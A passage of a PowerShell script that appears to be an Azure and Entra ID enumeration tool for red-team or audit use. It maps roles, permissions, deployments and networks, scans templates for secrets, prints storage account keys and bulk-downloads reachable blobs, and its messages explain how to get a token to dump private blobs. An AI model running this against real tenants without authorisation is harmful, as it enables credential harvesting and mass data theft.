    }   # end NoSecretTest

    # -- Directory Role Assignments --------------------------------------------
    Write-Section "Directory Role Assignments"
    $dirRoles = Get-GraphAll "$GraphBase/directoryRoles"
    $foundDirRoles = $false
    $dirRoles | ForEach-Object {
        $roleName    = $_.displayName
        $roleMembers = Get-GraphAll "$GraphBase/directoryRoles/$($_.id)/members?`$select=id,displayName,userPrincipalName"
        if ($roleMembers) {
            $foundDirRoles = $true
            Write-Hit "Role: $roleName"
            $roleMembers | ForEach-Object {
                $label = if ($_.userPrincipalName) { $_.userPrincipalName } else { $_.displayName }
                Write-Info "    - $label"
                Add-Summary "  [Entra Role] $label  =>  '$roleName'"
            }
        }
    }
    if (-not $foundDirRoles) { Write-None }

    # -- Administrative Units --------------------------------------------------
    Write-Section "Administrative Units"
    $aus = Get-GraphAll "$GraphBase/directory/administrativeUnits?`$select=id,displayName,description,visibility,membershipType,membershipRule&`$top=999"
    if (-not $aus) {
        Write-None
    } else {
        $auRows = New-Object System.Collections.Generic.List[object]
        foreach ($au in $aus) {
            Write-Hit "$($au.displayName)  |  ID: $($au.id)"
            Write-Info "    Description    : $($au.description)"
            Write-Info "    Visibility     : $($au.visibility)"
            Write-Info "    MembershipType : $($au.membershipType)"
            if ($au.membershipRule) {
                Write-Info "    MembershipRule : $($au.membershipRule)"
            }

            # Members of this AU (users, groups, devices)
            $auMembers = Get-GraphAll "$GraphBase/directory/administrativeUnits/$($au.id)/members?`$select=id,displayName,userPrincipalName"
            if ($auMembers) {
                Write-Info "    Members:"
                $auMembers | ForEach-Object {
                    $objType = if ($_.'@odata.type') { $_.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "unknown" }
                    $label   = if ($_.userPrincipalName) { $_.userPrincipalName } else { $_.displayName }
                    Write-Info "      [$objType] $label  (ID: $($_.id))"
                    $auRows.Add([PSCustomObject]@{
                        AUName     = $au.displayName
                        AUId       = $au.id
                        Relation   = "Member"
                        ObjectType = $objType
                        ObjectName = $_.displayName
                        ObjectUPN  = $_.userPrincipalName
                        ObjectId   = $_.id
                        RoleName   = ""
                        RoleId     = ""
                    })
                }
            } else { Write-Info "    Members: [none or no access]" }

            # Scoped role assignments within this AU
            # These are principals who have a directory role scoped to THIS AU only
            $scopedRoles = Get-GraphAll "$GraphBase/directory/administrativeUnits/$($au.id)/scopedRoleMembers"
            if ($scopedRoles) {
                Write-Info "    Scoped Role Members (roles limited to this AU):"
                $scopedRoles | ForEach-Object {
                    $srm       = $_
                    $roleName2 = $srm.roleMemberInfo.displayName
                    $rId       = $srm.roleId
                    $memberDisp = $srm.roleMemberInfo.displayName
                    $memberUPN  = $srm.roleMemberInfo.userPrincipalName
                    $memberLabel = if ($memberUPN) { $memberUPN } else { $memberDisp }
                    Write-Warn "      [SCOPED ROLE] $memberLabel  =>  Role: $($srm.roleMemberInfo.displayName)  (RoleId: $rId)"
                    Add-Summary "  [AU Scoped Role] $memberLabel  =>  '$($srm.roleMemberInfo.displayName)'  scoped to AU '$($au.displayName)'"
                    $auRows.Add([PSCustomObject]@{
                        AUName     = $au.displayName
                        AUId       = $au.id
                        Relation   = "ScopedRoleMember"
                        ObjectType = "User"
                        ObjectName = $memberDisp
                        ObjectUPN  = $memberUPN
                        ObjectId   = $srm.roleMemberInfo.id
                        RoleName   = $srm.roleMemberInfo.displayName
                        RoleId     = $rId
                    })
                }
            }
        }
        if ($auRows.Count -gt 0) {
            Save-Csv (Join-Path $IdDir "AdministrativeUnits.csv") $auRows
        }
    }
}

# =============================================================================
# SECTION 2 -- ARM RESOURCES  (requires -Token)
# =============================================================================

if (-not $Token) {
    Write-Host "`n[i] No ARM token provided -- skipping Azure resource enumeration." -ForegroundColor DarkGray
    # -- Summary ---------------------------------------------------------------
    Write-Header "SUMMARY"
    if ($script:SummaryLines.Count -eq 0) {
        Write-None "  No notable assignments found."
    } else {
        $script:SummaryLines | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
    }
    Write-Host "`n[+] Done. Output saved to: $OutRoot" -ForegroundColor Green
    Stop-Script 0
}

Write-Header "ARM RESOURCES"

$subs = Invoke-ArmApi "$ArmBase/subscriptions?api-version=2020-01-01"
if (-not $subs -or -not $subs.value) {
    Write-Warn "No subscriptions returned. Token may be invalid or lack permissions."
    Stop-Script 1
}

foreach ($sub in $subs.value) {

    $SUB  = $sub.subscriptionId
    $NAME = $sub.displayName

    Write-Header "SUBSCRIPTION: $NAME  ($SUB)"

    $SubDir = Join-Path $TenantDir $SUB
    $null = New-Item -ItemType Directory -Force -Path $SubDir

    # Fetch all resources up front -- needed for RG fallback + all-resources CSV
    $resources = Get-ArmAll "$ArmBase/subscriptions/$SUB/resources?api-version=2021-04-01"

    # -- Resource Groups -------------------------------------------------------
    Write-Section "Resource Groups"
    $rgs = Get-ArmAll "$ArmBase/subscriptions/$SUB/resourcegroups?api-version=2021-04-01"
    if ($rgs) {
        $rgs | ForEach-Object {
            Write-Info "  $($_.name)  [$($_.location)]  Tags: $($_.tags | ConvertTo-Json -Compress)"
        }
    } else {
        $resources | ForEach-Object {
            if ($_.id -match '/resourceGroups/([^/]+)/') { $Matches[1] }
        } | Sort-Object -Unique | ForEach-Object {
            Write-Info "  $_ [inferred from resources]"
        }
    }

    # -- Resource Group Deployments --------------------------------------------
    Write-Section "Resource Group Deployments"
    $deployDir  = Join-Path $SubDir "Deployments"
    $null = New-Item -ItemType Directory -Force -Path $deployDir
    $deployRows = New-Object System.Collections.Generic.List[object]

    # Always force $rgs to array; fallback to inferring names from resource IDs
    $rgList = @(if ($rgs) { $rgs } else {
        $resources | ForEach-Object {
            if ($_.id -match '/resourceGroups/([^/]+)/') { [PSCustomObject]@{ name = $Matches[1] } }
        } | Sort-Object name -Unique
    })

    foreach ($rg in $rgList) {
        $rgName = $rg.name
        if (-not $rgName) { continue }

        $deps = @(Get-ArmAll "$ArmBase/subscriptions/$SUB/resourceGroups/$rgName/providers/Microsoft.Resources/deployments?api-version=2021-04-01")
        if ($deps.Count -eq 0) {
            if (-not $Clean) { Write-Info "  RG: $rgName  -- no deployments" }
            continue
        }

        $rgDeployDir = Join-Path $deployDir $rgName
        $null = New-Item -ItemType Directory -Force -Path $rgDeployDir

        Write-Hit "  RG: $rgName  ($($deps.Count) deployment(s))"

        foreach ($dep in $deps) {
            $dName  = $dep.name
            $dState = $dep.properties.provisioningState
            $dMode  = $dep.properties.mode
            $dTime  = $dep.properties.timestamp
            $dBy    = $dep.properties.parameters | ConvertTo-Json -Compress -Depth 2

            $stateColor = switch ($dState) {
                "Succeeded" { "Green" }
                "Failed"    { "Red"   }
                default     { "Yellow" }
            }
            Write-Host "    [$dState]  $dName" -ForegroundColor $stateColor -NoNewline
            Write-Host "  Mode: $dMode  |  Time: $dTime" -ForegroundColor DarkGray

            # Always fetch full deployment details -- contains parameters, outputs etc.
            $depDetail = Invoke-ArmApi `
                "$ArmBase/subscriptions/$SUB/resourceGroups/$rgName/providers/Microsoft.Resources/deployments/$dName`?api-version=2021-04-01"

            # Save parameters to details file regardless of template availability
            if ($depDetail) {
                $detailPath = Join-Path $rgDeployDir "$dName-details.json"
                $depDetail | ConvertTo-Json -Depth 20 | Out-File -FilePath $detailPath -Encoding UTF8 -Force
                # Show parameters inline (valuable even without template)
                if ($depDetail.properties.parameters) {
                    Write-Info "      Parameters:"
                    $depDetail.properties.parameters.PSObject.Properties | ForEach-Object {
                        $pVal = if ($_.Value.value) { $_.Value.value } else { "($($_.Value.type))" }
                        Write-Info "        $($_.Name) = $pVal"
                    }
                }
                if ($depDetail.properties.outputs) {
                    Write-Warn "      Outputs (may contain secrets/endpoints):"
                    $depDetail.properties.outputs.PSObject.Properties | ForEach-Object {
                        Write-Warn "        $($_.Name) = $($_.Value.value)"
                    }
                }
            }

            # Try to get the ARM template -- cascade through multiple methods
            $tplSaved = $false
            $tplPath  = ""
            $tplObj   = $null

            # Method 1: POST exportTemplate (no body) -- works for Succeeded/Running
            # Az module uses api-version=2020-06-01 for this action
            foreach ($av in @("2020-06-01","2021-04-01","2019-10-01")) {
                if ($tplObj) { break }
                $tplResp = Invoke-ArmApi `
                    "$ArmBase/subscriptions/$SUB/resourceGroups/$rgName/providers/Microsoft.Resources/deployments/$dName/exportTemplate?api-version=$av" `
                    -Method "POST"
                if ($tplResp -and $tplResp.template) { $tplObj = $tplResp.template }
            }

            # Method 2: GET with $expand=template -- works when template stored inline
            if (-not $tplObj) {
                $expResp = Invoke-ArmApi `
                    "$ArmBase/subscriptions/$SUB/resourceGroups/$rgName/providers/Microsoft.Resources/deployments/$dName`?`$expand=template&api-version=2021-04-01"
                if ($expResp -and $expResp.properties.template) { $tplObj = $expResp.properties.template }
            }

            # Method 3: Az cmdlet fallback -- works even for failed deployments if Az context exists
            if (-not $tplObj) {
                try {
                    $tmpFile = Join-Path $env:TEMP "$dName.json"
                    Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $rgName `
                        -DeploymentName $dName -Path (Split-Path $tmpFile) -Force -ErrorAction Stop | Out-Null
                    if (Test-Path $tmpFile) {
                        $tplObj  = Get-Content $tmpFile -Raw | ConvertFrom-Json
                        Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue
                    }
                } catch { }
            }

            if ($tplObj) {
                $tplPath = Join-Path $rgDeployDir "$dName.json"
                $tplObj | ConvertTo-Json -Depth 20 | Out-File -FilePath $tplPath -Encoding UTF8 -Force
                Write-Info "      Template : saved -> $tplPath"
                $tplSaved = $true

                $tplJson = $tplObj | ConvertTo-Json -Depth 20
                if ($tplJson -match '"secureString"|[Pp]assword|[Ss]ecret|[Aa]pi[Kk]ey|[Cc]onnection[Ss]tring|[Ss]as[Tt]oken') {
                    Write-Warn "      [!] Sensitive parameters detected in template -- review: $dName.json"
                }
            } else {
                Write-Warn "      Template : all methods failed -- details saved to $dName-details.json"
            }

            $deployRows.Add([PSCustomObject]@{
                ResourceGroup = $rgName
                Deployment    = $dName
                State         = $dState
                Mode          = $dMode
                Timestamp     = $dTime
                TemplateSaved = $tplSaved
                TemplatePath  = $tplPath
            })
        }
    }

    if ($deployRows.Count -eq 0) { Write-None }
    Save-Csv (Join-Path $SubDir "Deployments.csv") $deployRows

    # -- All Resources ---------------------------------------------------------
    Write-Section "All Resources"
    $resources | ForEach-Object {
        Write-Info "  $($_.type)  |  $($_.name)  |  RG: $(Get-RGFromId $_.id)  |  $($_.location)"
    }
    Save-Csv (Join-Path $SubDir "AllResources.csv") (
        $resources | Select-Object id, name, type, location,
            @{N="resourceGroup"; E={Get-RGFromId $_.id}}, kind, sku
    )

    # -- Role Assignments (RBAC) -----------------------------------------------
    Write-Section "Role Assignments (RBAC)"
    $assignments = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
    $rbacRows = New-Object System.Collections.Generic.List[object]
    foreach ($ra in $assignments) {
        $roleName = Get-RoleName $ra.properties.roleDefinitionId
        $scope    = $ra.properties.scope
        $principalId  = $ra.properties.principalId
        $ptype    = $ra.properties.principalType
        $rg       = Get-RGFromId $scope
        $rgLabel  = if ($rg) { "  [RG: $rg]" } else { "" }
        Write-Hit "[$roleName]  $principalId  ($ptype)$rgLabel"
        Write-Info "    Scope: $scope"
        $rbacRows.Add([PSCustomObject]@{
            RoleName      = $roleName
            PrincipalId   = $principalId
            PrincipalType = $ptype
            Scope         = $scope
            ResourceGroup = $rg
        })
        Add-Summary "  [ARM RBAC] $ptype $principalId  =>  '$roleName'  on  $scope"
    }
    if (-not $assignments) { Write-None }
    Save-Csv (Join-Path $SubDir "RoleAssignments.csv") $rbacRows

    # -- Custom Role Definitions -----------------------------------------------
    Write-Section "Custom Role Definitions"
    $customRoles = Get-ArmAll ($ArmBase + "/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions" +
                               "?`$filter=type+eq+'CustomRole'&api-version=2022-04-01")
    if (-not $customRoles) { Write-None "  None" }
    $customRoles | ForEach-Object {
        Write-Hit $_.properties.roleName
        Write-Info "    Actions    : $($_.properties.permissions.actions     -join ', ')"
        Write-Info "    NotActions : $($_.properties.permissions.notActions  -join ', ')"
        Write-Info "    DataActions: $($_.properties.permissions.dataActions -join ', ')"
    }

    # -- My Permissions per Resource -------------------------------------------
    Write-Section "My Permissions per Resource"

    function Show-Perms {
        param([string]$Label, [string]$ResourceId)
        $perms = Get-MyPermissions $ResourceId
        if (-not $perms) { return }
        $actions     = $perms | ForEach-Object { $_.actions }     | Where-Object { $_ }
        $dataActions = $perms | ForEach-Object { $_.dataActions } | Where-Object { $_ }
        if (-not $actions -and -not $dataActions) { return }
        Write-Hit $Label
        foreach ($a in $actions) {
            if ($a -match "write|delete|action|start|stop|restart|run|reset|deploy|create|update|listkeys|listSecrets" -or $a -eq "*") {
                Write-Warn "    [ACTION] $a"
            } else {
                Write-Info "    [action] $a"
            }
        }
        foreach ($d in $dataActions) { Write-Warn "    [data]   $d" }
    }

    Show-Perms "Subscription: $SUB" "/subscriptions/$SUB"
    foreach ($rg in $rgs) {
        Show-Perms "RG: $($rg.name)" "/subscriptions/$SUB/resourceGroups/$($rg.name)"
    }
    foreach ($res in $resources) {
        Show-Perms "$($res.type.Split('/')[-1]): $($res.name)" $res.id
    }

    # -- Virtual Machines ------------------------------------------------------
    Write-Section "Virtual Machines"
    $vms = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01"
    if (-not $vms) { Write-None }
    foreach ($vm in $vms) {
        Write-Hit "$($vm.name)  [RG: $(Get-RGFromId $vm.id)]  [$($vm.location)]"
        Write-Info "    Size  : $($vm.properties.hardwareProfile.vmSize)"
        Write-Info "    OS    : $($vm.properties.storageProfile.osDisk.osType)"
        Write-Info "    Admin : $($vm.properties.osProfile.adminUsername)"
        if ($vm.identity) {
            Write-Info "    Identity: $($vm.identity.type)"
            if ($vm.identity.principalId) {
                Write-Info "    IdentityPrincipalId: $($vm.identity.principalId)"
                # Check if the managed identity SP is in any AU
                if ($GraphToken) {
                    $miMemberOf = Get-GraphAll "$GraphBase/servicePrincipals/$($vm.identity.principalId)/memberOf"
                    foreach ($mmo in $miMemberOf) {
                        $mmoType = if ($mmo.'@odata.type') { $mmo.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
                        if ($mmoType -eq "administrativeUnit") {
                            if (-not $auDescCache.ContainsKey($mmo.id)) {
                                $auDetail = Invoke-GraphApi "$GraphBase/directory/administrativeUnits/$($mmo.id)?`$select=id,displayName,description,visibility,membershipType"
                                $auDescCache[$mmo.id] = $auDetail
                            }
                            $cached = $auDescCache[$mmo.id]
                            $auDesc = if ($cached) { "  |  Desc: $($cached.description)  Visibility: $($cached.visibility)" } else { "" }
                            Write-Warn "    [ManagedIdentity in AU] $($mmo.displayName)  (ID: $($mmo.id))$auDesc"
                        } else {
                            Write-Info "    [Identity MemberOf $mmoType] $($mmo.displayName)  (ID: $($mmo.id))"
                        }
                    }
                }
            }
        }
        foreach ($nicRef in $vm.properties.networkProfile.networkInterfaces) {
            $nic = Invoke-ArmApi ($ArmBase + $nicRef.id + "?api-version=2023-04-01")
            if (-not $nic) { continue }

            # -- Effective NSG rules for this NIC -----
            $effNsg = Get-EffectiveNSG $nicRef.id
            if ($effNsg -and $effNsg.value) {
                Write-Info "    [Effective NSG Rules on NIC: $($nic.name)]"
                $effNsg.value | ForEach-Object {
                    $nsgName = ($_.networkSecurityGroup.id -split "/")[-1]
                    $_.effectiveSecurityRules | ForEach-Object {
                        Write-Info "      [$($_.direction)|$($_.access)] $($_.name): $($_.protocol) $($_.sourceAddressPrefix) -> $($_.destinationAddressPrefix):$($_.destinationPortRange)  (NSG: $nsgName)"
                    }
                }
            }

            foreach ($ipc in $nic.properties.ipConfigurations) {
                Write-Info "    Private IP : $($ipc.properties.privateIPAddress)"
                if ($ipc.properties.publicIPAddress) {
                    $pub = Invoke-ArmApi ($ArmBase + $ipc.properties.publicIPAddress.id + "?api-version=2023-04-01")
                    if ($pub) { Write-Info "    Public IP  : $($pub.properties.ipAddress)" }
                }
            }
        }
        $exts = Invoke-ArmApi ($ArmBase + $vm.id + "/extensions?api-version=2023-03-01")
        if ($exts -and $exts.value) {
            Write-Info "    Extensions : $(($exts.value | ForEach-Object { $_.name }) -join ', ')"
        }
    }

    # -- Network Security Groups -----------------------------------------------
    Write-Section "Network Security Groups"
    $nsgs = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Network/networkSecurityGroups?api-version=2023-04-01"
    if (-not $nsgs) { Write-None }
    foreach ($nsg in $nsgs) {
        Write-Hit "$($nsg.name)  [RG: $(Get-RGFromId $nsg.id)]  [$($nsg.location)]"
        if ($nsg.properties.securityRules) {
            Write-Info "    [Custom Rules]"
            $nsg.properties.securityRules | ForEach-Object {
                $p = $_.properties
                Write-Info "    [$($p.direction)|$($p.access)|Pri:$($p.priority)] $($_.name): $($p.protocol)  $($p.sourceAddressPrefix):$($p.sourcePortRange) -> $($p.destinationAddressPrefix):$($p.destinationPortRange)"
            }
        }
        if ($nsg.properties.defaultSecurityRules) {
            Write-Info "    [Default Rules]"
            $nsg.properties.defaultSecurityRules | ForEach-Object {
                $p = $_.properties
                Write-Info "    [$($p.direction)|$($p.access)|Pri:$($p.priority)] $($_.name): $($p.protocol)  $($p.sourceAddressPrefix) -> $($p.destinationAddressPrefix):$($p.destinationPortRange)"
            }
        }
        # NICs and subnets this NSG is associated with
        $assocNics    = $nsg.properties.networkInterfaces
        $assocSubnets = $nsg.properties.subnets
        if ($assocNics) {
            Write-Info "    Associated NICs:"
            $assocNics | ForEach-Object { Write-Info "      - $(($_.id -split '/')[-1])" }
        }
        if ($assocSubnets) {
            Write-Info "    Associated Subnets:"
            $assocSubnets | ForEach-Object { Write-Info "      - $(($_.id -split '/')[-1])" }
        }
    }

    # -- Virtual Networks ------------------------------------------------------
    Write-Section "Virtual Networks"
    $vnets = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Network/virtualNetworks?api-version=2023-04-01"
    if (-not $vnets) { Write-None }
    foreach ($vnet in $vnets) {
        Write-Hit "$($vnet.name)  [RG: $(Get-RGFromId $vnet.id)]  [$($vnet.location)]  $($vnet.properties.addressSpace.addressPrefixes -join ', ')"
        $vnet.properties.subnets | ForEach-Object {
            $nsgTag = if ($_.properties.networkSecurityGroup) {
                "  NSG:" + ($_.properties.networkSecurityGroup.id -split "/")[-1]
            } else { "" }
            $rtTag = if ($_.properties.routeTable) {
                "  RT:" + ($_.properties.routeTable.id -split "/")[-1]
            } else { "" }
            Write-Info "    Subnet: $($_.name)  $($_.properties.addressPrefix)$nsgTag$rtTag"
        }
        if ($vnet.properties.virtualNetworkPeerings) {
            Write-Info "    Peerings:"
            $vnet.properties.virtualNetworkPeerings | ForEach-Object {
                Write-Info "      - $($_.name)  RemoteVNet: $(($_.properties.remoteVirtualNetwork.id -split '/')[-1])  State: $($_.properties.peeringState)"
            }
        }
        if ($vnet.properties.dhcpOptions.dnsServers) {
            Write-Info "    DNS Servers: $($vnet.properties.dhcpOptions.dnsServers -join ', ')"
        }
    }

    # -- Public IP Addresses ---------------------------------------------------
    Write-Section "Public IP Addresses"
    $pips = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Network/publicIPAddresses?api-version=2023-04-01"
    if (-not $pips) { Write-None }
    $pips | ForEach-Object {
        $ip = if ($_.properties.ipAddress) { $_.properties.ipAddress } else { "[unassigned]" }
        Write-Hit "$($_.name)  [RG: $(Get-RGFromId $_.id)]  $ip  [$($_.properties.publicIPAllocationMethod)]"
        if ($_.properties.dnsSettings.fqdn) {
            Write-Info "    FQDN: $($_.properties.dnsSettings.fqdn)"
        }
    }

    # -- Storage Accounts ------------------------------------------------------
    Write-Section "Storage Accounts"
    $storageAccounts = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01"
    if (-not $storageAccounts) { Write-None }

    $saRootDir = Join-Path $SubDir "StorageAccounts"

    foreach ($sa in $storageAccounts) {
        $saName = $sa.name
        $saRG   = Get-RGFromId $sa.id
        Write-Hit "$saName  [RG: $saRG]  [$($sa.location)]"
        Write-Info "    Kind                : $($sa.kind)"
        Write-Info "    HTTPS Only          : $($sa.properties.supportsHttpsTrafficOnly)"
        Write-Info "    Public Blob Access  : $($sa.properties.allowBlobPublicAccess)"
        Write-Info "    Allow Shared Key    : $($sa.properties.allowSharedKeyAccess)"
        Write-Info "    Min TLS Version     : $($sa.properties.minimumTlsVersion)"
        if ($sa.properties.networkAcls) {
            $acl = $sa.properties.networkAcls
            Write-Info "    Network ACL Default : $($acl.defaultAction)"
            $acl.ipRules             | ForEach-Object { Write-Info "    ACL IP Allow: $($_.value)  Action: $($_.action)" }
            $acl.virtualNetworkRules | ForEach-Object { Write-Info "    ACL VNet Allow: $(($_.id -split '/')[-1])" }
        }

        # ARM container list (metadata only -- no blob data, always works with RBAC)
        # Paginate with nextLink so all containers are shown even for large accounts.
        $armCtrs     = Invoke-ArmApi "$ArmBase$($sa.id)/blobServices/default/containers?api-version=2023-01-01"
        $armCtrNames = @()
        $armCtrPage  = $armCtrs
        while ($armCtrPage -and $armCtrPage.value) {
            $armCtrPage.value | ForEach-Object {
                $armCtrNames += $_.name
                Write-Info "    Container: $($_.name)  PublicAccess: $($_.properties.publicAccess)"
            }
            if ($armCtrPage.nextLink) { $armCtrPage = Invoke-ArmApi $armCtrPage.nextLink } else { break }
        }

        # Try to get storage account keys (requires Microsoft.Storage/storageAccounts/listKeys/action)
        $blobKey = $null
        $keys    = Invoke-ArmApi "$ArmBase$($sa.id)/listKeys?api-version=2023-01-01" "POST"
        if ($keys -and $keys.keys) {
            $blobKey = ($keys.keys | Where-Object { $_.keyName -eq "key1" } | Select-Object -First 1).value
            if (-not $blobKey) { $blobKey = $keys.keys[0].value }
            $keys.keys | ForEach-Object { Write-Warn "    Key ($($_.keyName)): $($_.value)" }
        }

        # Determine blob data-plane auth mode (priority: SharedKey > StorageToken > anonymous)
        $authMode    = if ($blobKey) { "SharedKey" } elseif ($StorageToken) { "AAD" } else { "Anonymous" }
        $blobBaseUrl = "https://$saName.blob.core.windows.net"

        # Helper: build correct auth headers per request (SharedKey requires fresh timestamp per call)
        $mkHdr = {
            param($Mthd, $BPath, $BQuery = "")
            if ($blobKey) {
                Get-BlobSharedKeyHeaders -Account $saName -Key $blobKey -Method $Mthd -Path $BPath -Query $BQuery
            } elseif ($StorageToken) {
                @{ "Authorization" = "Bearer $StorageToken"; "x-ms-version" = "2020-08-04" }
            } else {
                @{ "x-ms-version" = "2020-08-04" }
            }
        }

        if ($NoStorageDump) {
            Write-Info "    [--NoStorageDump] Blob enumeration skipped  [AuthMode: $authMode]"
            continue
        }

        Write-Info "    [Blob Auth] $authMode"
        if ($authMode -eq "Anonymous") {
            Write-Warn "    [!] listKeys denied AND no -StorageToken -- only PUBLIC containers accessible"
            Write-Warn "        To dump private blobs, rerun with -StorageToken:"
            Write-Warn "        Step 1:  Connect-AzAccount   (or use existing az session)"
            Write-Warn "        Step 2:  `$storageToken = (Get-AzAccessToken -ResourceUrl 'https://storage.azure.com/').Token"
            Write-Warn "        Step 3:  .\all.ps1 ... -StorageToken `$storageToken"
        } elseif ($authMode -eq "AAD") {
            # Decode the token to show identity and audience for diagnostics
            $claims = Get-JwtClaims $StorageToken
            if ($claims) {
                $tAud  = if ($claims.aud) { $claims.aud } else { "unknown" }
                $tUpn  = if ($claims.upn) { $claims.upn } elseif ($claims.unique_name) { $claims.unique_name } elseif ($claims.oid) { "OID:$($claims.oid)" } else { "unknown" }
                $tExp  = if ($claims.exp) { [DateTimeOffset]::FromUnixTimeSeconds($claims.exp).ToLocalTime().ToString("HH:mm:ss") } else { "?" }
                Write-Info "    [StorageToken] Identity: $tUpn  |  aud: $tAud  |  expires: $tExp"
                if ($tAud -notlike "*storage.azure.com*") {
                    Write-Warn "    [!!!] WRONG AUDIENCE -- token aud='$tAud' but blob data-plane needs 'https://storage.azure.com/'"
                    Write-Warn "          All blob requests will return 401/403. Get the correct token:"
                    Write-Warn "          `$StorageToken = (Get-AzAccessToken -ResourceUrl 'https://storage.azure.com/').Token"
                }
            }
        }

        # Build a complete container list by merging BOTH sources with full pagination.
        # ARM gives management-plane names (always works with RBAC).
        # Blob service may return different/more containers depending on data-plane access.
        # Taking the UNION ensures no container is missed due to partial access.

        $ctrNameSet = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)

        # Seed from ARM names already collected above (pagination already done)
        foreach ($n in $armCtrNames) { $null = $ctrNameSet.Add($n) }

        # -- Blob service paginated container list (adds any containers ARM didn't show) --
        $script:LastBlobError = ""
        $blobSvcMkr = ""
        $blobSvcOk  = $false
        do {
            $blobSvcQ   = "comp=list" + $(if ($blobSvcMkr) { "&marker=$blobSvcMkr" } else { "" })
            $blobSvcXml = Invoke-BlobRaw "$blobBaseUrl/?$blobSvcQ" (& $mkHdr "GET" "/" $blobSvcQ)
            if ($blobSvcXml) {
                $blobSvcOk = $true
                try {
                    [xml]$csx    = $blobSvcXml
                    $csx.EnumerationResults.Containers.Container | ForEach-Object { $null = $ctrNameSet.Add($_.Name) }
                    $blobSvcMkr  = $csx.EnumerationResults.NextMarker
                } catch { $blobSvcMkr = ""; break }
            } else { break }
        } while ($blobSvcMkr)

        if (-not $blobSvcOk -and $script:LastBlobError) {
            Write-Warn "    [!] Blob service container list failed: $($script:LastBlobError)"
            if ($authMode -eq "AAD" -and $script:LastBlobError -like "*AuthorizationPermissionMismatch*") {
                Write-Warn "        Token is valid but lacks 'Storage Blob Data Reader' at the account level"
                Write-Warn "        (per-container access may still work via container-level RBAC)"
            }
        }

        $ctrNames = @($ctrNameSet)
        Write-Info "    [Containers found] ARM: $($armCtrNames.Count)  BlobSvc: $(if ($blobSvcOk) { 'OK' } else { 'failed' })  Union total: $($ctrNames.Count)"

        if (-not $ctrNames) {
            Write-Info "    No containers found"
            continue
        }

        # Per-account output directory
        $saOutDir = Join-Path $saRootDir $saName
        $null = New-Item -ItemType Directory -Force -Path $saOutDir

        $allBlobRows  = [System.Collections.Generic.List[object]]::new()
        $tooLargeRows = [System.Collections.Generic.List[object]]::new()
        $dlCount = 0; $failCount = 0

        foreach ($ctrName in $ctrNames) {
            Write-Info "    [Container] $ctrName"
            $marker = ""
            do {
                $listQuery = "restype=container&comp=list" + $(if ($marker) { "&marker=$marker" } else { "" })
                $listUrl   = "$blobBaseUrl/$ctrName`?$listQuery"
                $blobXml   = Invoke-BlobRaw $listUrl (& $mkHdr "GET" "/$ctrName" $listQuery)
                if (-not $blobXml) {
                    $blobErrDetail = if ($script:LastBlobError) { " -- $($script:LastBlobError)" } else { "" }
                    if ($authMode -eq "Anonymous") {
                        Write-Info "      [Private] $ctrName -- needs -StorageToken (see above)"
                    } else {
                        Write-Warn "      [No Access] $ctrName$blobErrDetail"
                        if ($blobErrDetail -like "*AuthorizationPermissionMismatch*") {
                            Write-Warn "        [!] Have token but MISSING 'Storage Blob Data Reader' RBAC on this container/account"
                        } elseif ($blobErrDetail -like "*AuthorizationFailure*") {
                            Write-Warn "        [!] Token rejected -- check audience (should be https://storage.azure.com/)"
                        }
                    }
                    break
                }

                try { [xml]$bx = $blobXml } catch {
                    Write-Warn "      [XML PARSE ERROR] Could not parse blob listing response: $($_.Exception.Message)"
                    Write-Warn "      Raw response (first 300 chars): $($blobXml.Substring(0, [Math]::Min(300, $blobXml.Length)))"
                    break
                }
                $marker    = $bx.EnumerationResults.NextMarker
                $blobNodes = @($bx.SelectNodes("//Blob"))  # XPath -- avoids any property name conflicts

                if ($blobNodes.Count -eq 0 -and -not $marker) {
                    Write-Info "      [Empty] No blobs found in $ctrName"
                }

                foreach ($blob in $blobNodes) {
                    $nameNode = $blob.SelectSingleNode("Name")
                    if (-not $nameNode) { continue }
                    $blobName = $nameNode.InnerText
                    $blobSize = [long]($blob.SelectSingleNode("Properties/Content-Length").InnerText)
                    $blobType = try { $blob.SelectSingleNode("Properties/Content-Type").InnerText } catch { "" }
                    $blobMod  = try { $blob.SelectSingleNode("Properties/Last-Modified").InnerText } catch { "" }
                    $blobUrl  = "$blobBaseUrl/$ctrName/$blobName"
                    $sizeMB   = [Math]::Round($blobSize / 1MB, 2)

                    $allBlobRows.Add([PSCustomObject]@{
                        StorageAccount = $saName; Container = $ctrName
                        BlobName = $blobName; SizeMB = $sizeMB
                        ContentType = $blobType; LastModified = $blobMod
                        DirectUrl = $blobUrl; AuthMode = $authMode
                    })

                    if ($blobSize -gt 10MB) {
                        Write-Warn "      [LARGE $sizeMB MB] $blobName"
                        Write-Warn "        Direct URL (open in browser while authenticated): $blobUrl"
                        $tooLargeRows.Add([PSCustomObject]@{
                            StorageAccount = $saName; Container = $ctrName
                            BlobName = $blobName; SizeMB = $sizeMB
                            ContentType = $blobType; LastModified = $blobMod
                            DirectUrl = $blobUrl
                        })
                        Add-Summary "  [BLOB >10MB] $saName/$ctrName/$blobName  ($sizeMB MB)  URL: $blobUrl"
                    } else {
                        # Build a safe local path -- replace forward slashes (blob path separators) with OS separator
                        $safeName = $blobName -replace "/", [System.IO.Path]::DirectorySeparatorChar
                        $outPath  = Join-Path $saOutDir (Join-Path $ctrName $safeName)
                        $dlHdrs   = & $mkHdr "GET" "/$ctrName/$blobName"
                        $ok       = Save-BlobFile -Uri $blobUrl -Headers $dlHdrs -OutputPath $outPath
                        if ($ok) {
                            $dlCount++
                            Write-Info "      [DL $sizeMB MB] $blobName -> $outPath"
                            Add-Summary "  [BLOB DL] $saName/$ctrName/$blobName  -> $outPath"
                        } else {
                            $failCount++
